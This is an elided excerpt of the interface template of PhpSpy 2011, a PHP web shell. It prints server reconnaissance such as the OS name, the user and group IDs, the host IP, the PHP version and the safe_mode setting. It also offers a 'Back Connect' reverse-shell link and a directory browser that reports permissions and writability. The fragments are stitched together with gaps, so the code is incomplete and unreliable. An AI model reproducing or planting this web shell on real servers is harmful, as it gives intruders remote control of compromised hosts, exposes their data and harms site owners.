...
<title>';echo $action.' - '.$_SERVER['HTTP_HOST'];;echo '</title>
<style type="text/css">
...
;echo '<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td><span style="float:right;">';echo @php_uname();;echo ' / User:';echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';;echo '</span>';echo $_SERVER['HTTP_HOST'];;echo ' (';echo gethostbyname($_SERVER['SERVER_NAME']);;echo ')</td>
	</tr>
	<tr class="alt1">
		<td>
			<span style="float:right;">PHP ';echo PHP_VERSION;;echo ' / Safe Mode:';echo getcfg('safe_mode');;echo '</span>
			...
			';if (!IS_WIN) {;echo ' | <a href="javascript:g(\'backconnect\');">Back Connect</a>';};echo '		</td>
	</tr>
</table>
...
<div style="background:#eee;margin-bottom:10px;">
	<table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
		<tr>
			<td width="100%">';echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);;echo ' (';echo $dir_writeable;;echo ')</td>
	...
	<form action="" method="post" id="godir" name="godir">
		<tr>
			...
			<td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="';echo $nowpath;;echo '" type="text" style="width:99%;margin:0 8px;"></td>
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
	...
	Powered by <a title="Build 20110502" href="http://www.4ngel.net" target="_blank">';echo str_replace('.','','P.h.p.S.p.y');;echo ' 2011</a>. Copyright (C) 2004-2011 <a href="http://www.4ngel.net" target="_blank">Security Angel Team [S4T]</a> All Rights Reserved.
</div>
</body>
</html>
